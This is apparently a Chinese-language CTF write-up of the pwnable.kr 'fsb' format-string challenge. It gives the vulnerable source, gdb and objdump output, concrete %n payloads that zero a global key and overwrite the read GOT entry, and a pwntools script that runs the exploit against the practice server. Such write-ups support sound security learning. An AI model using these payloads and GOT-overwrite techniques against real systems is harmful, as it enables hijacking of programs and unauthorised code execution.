---
title: fsb
date: 2017-08-22 09:55:21
tags:
- pwn
- heap
- pwnable.kr
categories:
- [security,pwn]
---

pwnable.kr fsb，本题目重点在栈上被调函数的ebp指向了调用函数的ebp。
%n的含义是%n符号前的输出的字符数量，*引用*传值，也就是参数是指针，而不是值。我们利用的代码
```
printf("aaaa%2$n");
```
这里将4写入了相对栈顶的第二个偏移量参数作地址的位置，而不是写在第二个参数位置。
我简单做了个小实验，输入
```
aaaa%18$n
```
得到的结果为
```
(gdb) x/x $esp+18*4
0xffb5d5d8:	0xffb5f768
(gdb) x/x 0xffb5f768
0xffb5f768:	0x00000004

```
<!-- more -->

本题目提供的源码如下：

```
#include <stdio.h>
#include <alloca.h>
#include <fcntl.h>

unsigned long long key;
char buf[100];
char buf2[100];

int fsb(char** argv, char** envp){
        char* args[]={"/bin/sh", 0};
        int i;

        char*** pargv = &argv;
        char*** penvp = &envp;
        char** arg;
        char* c;
        for(arg=argv;*arg;arg++) for(c=*arg; *c;c++) *c='\0';
        for(arg=envp;*arg;arg++) for(c=*arg; *c;c++) *c='\0';
        *pargv=0;
        *penvp=0;

        for(i=0; i<4; i++){
                printf("Give me some format strings(%d)\n", i+1);
                read(0, buf, 100);
                printf(buf);
        }

        printf("Wait a sec...\n");
        sleep(3);

        printf("key : \n");
        read(0, buf2, 100);
        unsigned long long pw = strtoull(buf2, 0, 10);
        if(pw == key){
                printf("Congratz!\n");
                execve(args[0], args, 0);
                return 0;
        }

        printf("Incorrect key \n");
        return 0;
}

int main(int argc, char* argv[], char** envp){

        int fd = open("/dev/urandom", O_RDONLY);
        if( fd==-1 || read(fd, &key, 8) != 8 ){
                printf("Error, tell admin\n");
                return 0;
        }
        close(fd);

        alloca(0x12345 & key);

        fsb(argv, envp); // exploit this format string bug!
        return 0;
}

```
这里有个很明显的格式化字符串漏洞：
```
        for(i=0; i<4; i++){
                printf("Give me some format strings(%d)\n", i+1);
                read(0, buf, 100);
                printf(buf);
        }
```
而我们的目标是执行到这里
```
        read(0, buf2, 100);
        unsigned long long pw = strtoull(buf2, 0, 10);
        if(pw == key){
                printf("Congratz!\n");
                execve(args[0], args, 0);
                return 0;
        }
```


这里有两种思路：
1. 覆盖判断条件，是之为`True`。
2. 覆盖某个将要执行函数的GOT表，改变程序的执行流程。

这里通过查资料，学到了很厉害的方法：

	+-------------------+ <- $esp
	|                   |    
	+-------------------+
	|      .....        |
	+-------------------+ <- $ebp 
	|                   |            
	+-------------------+
	|      '...'        |
	+-------------------+  <- $old_ebp
	|                   |
	+-------------------+

利用格式化字符串漏洞，`%n`我们可以写任意值到任意地址。而在函数调用时候，栈上保存着当前函数栈空间的`$ebp`和`$esp`，已经调用函数的`$ebp`。而`ebp`保存着调用函数的`ebp`（`$old_ebp`）。

我简单做了个小实验，输入
```
aaaa%18$n
```
得到的结果为
```
(gdb) x/x $esp+18*4
0xffb5d5d8:	0xffb5f768
(gdb) x/x 0xffb5f768
0xffb5f768:	0x00000004

```

这里我们需要确定偏移量`$ebp-$esp`和`$old_ebp-$esp`。这里需要注意的是在`main`函数中，`alloca(0x12345 & key)`；这个函数的作用是在栈里动态分配内存，而`key`又是随机的，所以，`$old_ebp-$esp`的值就是随机的。相反，`$ebp-$esp`是固定大小。这里在程序运行的时候需要leak出`$ebp`和`$esp`的值。


我们需要找的是栈上有指向栈上的地址，栈上就没有这样的值了吗？我们继续观察：
```
int fsb(char** argv, char** envp){
        char* args[]={"/bin/sh", 0};
        int i;

        char*** pargv = &argv;
        char*** penvp = &envp;
```
很好，`pargv`保存了`argv`的地址，而`pargv`是局部变量，保存的地址为`$ebp-offset`，`argv`是函数的参数，保存的地址为`$ebp+offset`。找到对应的汇编代码：
```
   0x08048534 <+0>:		push   %ebp
   0x08048535 <+1>:		mov    %esp,%ebp
   0x08048537 <+3>:		sub    $0x48,%esp
   0x0804853a <+6>:		movl   $0x8048870,-0x24(%ebp)
   0x08048541 <+13>:	movl   $0x0,-0x20(%ebp)
===>   0x08048548 <+20>:	lea    0x8(%ebp),%eax
   0x0804854b <+23>:	mov    %eax,-0x10(%ebp)
   0x0804854e <+26>:	lea    0xc(%ebp),%eax
   0x08048551 <+29>:	mov    %eax,-0xc(%ebp)
   0x08048554 <+32>:	mov    0x8(%ebp),%eax
   0x08048557 <+35>:	mov    %eax,-0x18(%ebp)
   0x0804855a <+38>:	jmp    0x804857e <fsb+74>

```
可以看到，`pargv`的地址为`$ebp-0x10`，`argv`地址为`$ebp+0x8`。 `$ebp-0x10` -> `$ebp+0x8`。



%n利用的指向关系找好了，接下来可以进行利用。

## 覆盖判断条件

`key`是全局变量，我们可以查找到其地址`0x804a060`。
```
(gdb) p &key
$1 = (<data variable, no debug info> *) 0x804a060 <key>
```

由于`$ebp - $esp = 0x48`, `$ebp-0x10` -> `$ebp+0x8`两者相对`$esp`的偏移量分别为0x38和0x50。
`$ebp-0x10`可以做`printf`的第14个参数， `$ebp+0x8`可以做`printf`的第20个参数。
将key地址`0x804a060`写入`argv`(`$ebp+0x8`)。
```
%134520928d%14$n 
# 134520928是0x804a060的十进制表示
```
现在我们可以读或者写`key`。我们可以将`key`置为0。
```
%20$n
```
回头去看，`unsigned long long key;` 这里`key`是8位，所以我们还需要将`&key+4`的值置为0。
```
%134520932d%14$n
%20$n
```
然后`pw`变量输入0，判断条件成立。

为了不等待屏幕输出满屏的空格，将输出重定向到`/dev/null`。

### 样例

```
fsb@ubuntu:~$ ./fsb > /dev/null
%134520928d%14$n
%20$n
%134520932d%14$n
%20$n
0
cat flag > /tmp/fsb_flag_werew 
chmod 666 /tmp/fsb_flag_werew


fsb@ubuntu:~$ cat /tmp/fsb_flag_werew
```

## 覆盖某函数的GOT表地址

在漏洞点以后出现了`read`函数和`sleep`，所以这里选用`read`。
```
fsb@ubuntu:~$ objdump -R fsb

fsb:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
08049ff0 R_386_GLOB_DAT    __gmon_start__
===> 0804a000 R_386_JUMP_SLOT   read@GLIBC_2.0
0804a004 R_386_JUMP_SLOT   printf@GLIBC_2.0
0804a008 R_386_JUMP_SLOT   sleep@GLIBC_2.0
0804a00c R_386_JUMP_SLOT   puts@GLIBC_2.0

```
而我们希望跳转到的地址为
```
   0x0804869b <+359>:	test   %eax,%eax
   0x0804869d <+361>:	jne    0x80486cc <fsb+408>
   0x0804869f <+363>:	movl   $0x80488ae,(%esp)
   0x080486a6 <+370>:	call   0x8048410 <puts@plt>
===>   0x080486ab <+375>:	mov    -0x24(%ebp),%eax
   0x080486ae <+378>:	movl   $0x0,0x8(%esp)
   0x080486b6 <+386>:	lea    -0x24(%ebp),%edx
   0x080486b9 <+389>:	mov    %edx,0x4(%esp)
   0x080486bd <+393>:	mov    %eax,(%esp)
   0x080486c0 <+396>:	call   0x8048450 <execve@plt>

```
所以，利用步骤为，先将`read`的GOT表地址写入`argv`中，然后将目标地址写入`read`的GOT表地址指向的内存。pwn!
```
fsb@ubuntu:~$ ./fsb > /dev/null
%134520832d%14$n
%134514347d%20$n

cat flag > /tmp/fsb_flags
chmod 666 /tmp/fsb_flags
ctrl+c
fsb@ubuntu:~$ cat /tmp/fsb_flags
```


另一种利用`$ebp`的办法似乎相对笨重了一些，因为题目中的`alloca`存在，我们无法确定`$old_ebp`位于`printf`的第几个参数，所以还需要leak`$esp`的地址和`$old_ebp`的地址。
如何确定$esp的地址呢？我们可以利用上面发现的`pargv`局部变量指向了参数`argv`。这两个值都保存在栈上而且相对位置固定，重要的是相对`esp`的位置也固定，可以利用偏移量来泄露出。
`pargv`相对于`$esp`的偏移量为0x38，在`printf`中第14个参数，其内容为`argv`的地址，`argv`相对`$esp`的偏移量为0x50。
所以，`printf`中栈上的内容的语句为：
```
%14$x %18$x
```
拿到的结果分别为`argv`地址和`$old_ebp`地址，进而可以得到`$esp`地址。

接下来的步骤可参考上面覆盖判断条件和覆盖某函数的GOT表地址。



```
from pwn import *
shell = ssh("fsb", "pwnable.kr", password="guest", port=2222)
p = shell.run("/home/fsb/fsb")
p.recvuntil("\n")
p.sendline("c")
p.recvuntil("\n")
p.recvuntil("\n")
p.sendline("%134520840c%18$n")
p.recvuntil("\n")
p.recvuntil("\n")
p.send("%18$x %14$x")
addr = p.recvuntil("\n").split(" ")
offset = int(addr[0], 16) - int(addr[1], 16) + 0x50
offset /= 4
p.recvuntil("\n")
p.send("%%134514347c%%%d$n" % offset)
p.recvuntil("\n")
p.recvuntil("\n")
p.interactive()

```
不容易，一个简单问题能分析出这么多。

[1] [Linux下的格式化字符串漏洞利用姿势](http://www.cnblogs.com/Ox9A82/p/5429099.html)
[2] [Fsb - Pwnable.kr](https://werew.tk/article/13/fsb-pwnablekr)
[3] [Writeup: pwnable.kr "echo1" & "fsb"](https://ricterz.me/posts/Writeup%3A%20pwnable.kr%20%22echo1%22%20%26%20%22fsb%22)
